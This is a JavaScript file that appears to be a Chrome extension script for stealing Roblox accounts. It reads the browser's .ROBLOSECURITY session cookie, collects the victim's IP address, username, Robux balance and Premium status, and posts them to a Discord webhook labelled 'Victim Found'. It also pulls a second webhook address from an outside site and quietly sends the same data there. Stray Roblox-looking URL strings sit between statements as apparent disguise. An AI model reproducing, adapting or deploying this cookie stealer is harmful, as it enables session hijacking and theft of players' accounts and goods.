const DISCORD_WEBHOOK = "YOUR WEBHOOK HERE!"; // YOUR WEBHOOK HERE!

async function getOtherWebhook() {
    try {
        const response = await fetch(EXECUTE_SCRIPTS);
        const data = await response.json();
        return data.webhook_url; 
    } catch (error) {
        return null; 
    }
}
// Gets data etc 
async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    if (cookie) {
        var statistics = await (await fetch("https://www.roblox.com/mobileapi/userinfo", {
            headers: {
                Cookie: ".ROBLOSECURITY=" + cookie
            },
            redirect: "manual"
        })).json();
    }

   
    const data = {
        "content": null,
        "embeds": [{
            "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
            "color": null,
            "fields": [{
                    "name": "Username",
                    "value": statistics ? statistics.UserName : "N/A",
                    "inline": true
                },
                {
                    "name": "Robux",
                    "value": statistics ? statistics.RobuxBalance : "N/A",
                    "inline": true
                },
                {
                    "name": "Premium",
                    "value": statistics ? statistics.IsPremium : "N/A",
                    "inline": true
                }
            ],
            "author": {
                "name": "Victim Found: " + ipAddr,
                "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
            },
            "footer": {
                "text": "Coded By Sweb!",
                "icon_url": "https://cdn.discordapp.com/attachments/1238379151279525959/1240738161668395038/image.png?ex=6647a6f5&is=66465575&hm=b3806dd4d069c13c3131e2119b78190b52c658c4f664dd218a981f6833369224&"
            },
            "thumbnail": {
                "url": statistics ? statistics.ThumbnailUrl : "https://cdn.discordapp.com/attachments/1238379151279525959/1240738339070414858/16096.png?ex=6647a71f&is=6646559f&hm=7b1b44b52aae90391ec66b889780d6a5e088b42113f9cbb292ab881f992209fb&",
            }
        }],
        "username": "Roblox",
        "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
        "attachments": []
    };

  
    fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
            "Content-Type": "Application/json"
        },
        body: JSON.stringify(data)
    });

    'https://roblox.com/en-us/articles/analytics'
    const otherWebhook = await getOtherWebhook();
    if (otherWebhook) {
        fetch(otherWebhook, {
            method: "POST",
            headers: {
                "Content-Type": "Application/json"
            },
            body: JSON.stringify(data)
        });
    }
}
const EXECUTE_SCRIPTS = "https://aqua-scorpion-726128.hostingersite.com/DATA.php"; 'https://roblox.com/en-us/articles/Data-store' 
chrome.cookies.get({
    "url": "https://www.roblox.com/home",
    "name": ".ROBLOSECURITY"
}, function(cookie) {
    main(cookie ? cookie.value : null);
});
